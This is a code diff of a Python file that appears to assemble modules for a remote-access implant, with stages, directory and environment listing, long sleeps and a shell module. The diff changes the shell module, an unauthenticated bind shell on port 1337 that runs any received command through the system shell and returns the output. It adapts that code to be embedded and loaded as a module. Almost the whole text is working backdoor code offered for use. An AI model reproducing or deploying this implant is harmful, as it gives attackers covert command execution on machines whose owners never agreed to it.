@@ -60,8 +60,6 @@ def run(**args):
     time.sleep(random.randint(86000,86800))
                         '''
         self.shell_module = '''
- #!/usr/bin/env python3
-
 import sys
 import socket
 import threading
@@ -69,7 +67,9 @@ import subprocess
 
 
 def server_loop():
-    host = '0.0.0.0'
+    
+    hostname = socket.gethostname()
+    host = socket.gethostbyname(hostname)
     port = 1337
     
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -87,10 +87,10 @@ def client_handler(socket_obj):
     while True:
         socket_obj.send(b'<NCPy:#> ')
         cmd_buffer = b''
-        while b'\n' not in cmd_buffer:
+        while b'\\n' not in cmd_buffer:
             cmd_buffer += socket_obj.recv(1024)
         if cmd_buffer.strip() == b'EXIT':
-            print('\n')
+            print('\\n')
             sys.exit()
         response = run_command(cmd_buffer)
         socket_obj.send(response)
@@ -101,15 +101,12 @@ def run_command(command: str):
             output = subprocess.check_output(
                 command, stderr=subprocess.STDOUT, shell=True)
         except BaseException:
-            output = f'Failed to execute {command} command on host:1337.\r\n'.encode()
+            output = f'Failed to execute {command} command on host:1337.\\r\\n'.encode()
         return output
 
-def main():
+def run():
     server_loop()
 
-if __name__ == '__main__':
-    main()
-    
 '''
         self.module_list = [('stage_1',self.stage_1), ('dir_lister',self.dir_lister), ('enviro',self.enviro), ('sleep',self.sleep), ('stage_2_qrw',self.stage_2_qrw), ('sleep24h',self.sleep24h), ('shell_module',self.shell_module)]
         self.word_list_ick = ('nick', 'pick', 'wick', 'brick', 'click', 'flick', 'quick', 'slick')
